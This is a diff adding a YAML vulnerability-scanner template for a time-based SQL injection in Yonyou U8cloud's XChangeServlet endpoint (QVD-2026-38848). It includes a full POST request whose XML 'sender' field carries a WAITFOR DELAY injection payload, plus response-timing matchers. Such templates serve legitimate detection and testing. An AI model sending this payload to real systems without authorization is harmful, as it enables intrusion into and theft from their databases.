@@ -1,0 +1,47 @@
+id: yonyou-u8-cloud-XChangeServlet-sqli
+info:
+  name: 用友U8cloud XChangeServlet SQL注入漏洞(QVD-2026-38848)
+  author: leadlife
+  severity: high
+  description: 用友U8cloud XChangeServlet SQL注入漏洞(QVD-2026-38848)，攻击者可进行sql注入攻击获取数据库信息或者权限。
+  reference: 
+    - https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/07/%E7%94%A8%E5%8F%8BU8cloud%20XChangeServlet%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2026-38848)/%E7%94%A8%E5%8F%8BU8cloud%20XChangeServlet%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(QVD-2026-38848).md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,u8cloud
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /service/XChangeServlet HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/xml
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/456 Safari/537.36
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <ufinterface roession="test" account="" billtype="gl" groupcode="01" sender="Y0-test';WAITFOR DELAY '0:0:5'--" receiver="101" proc="import">
+            <bill id="0001">
+                <billhead>
+                    <pk_org>test</pk_org>
+                </billhead>
+            </bill>
+        </ufinterface>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'WAITFOR DELAY')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
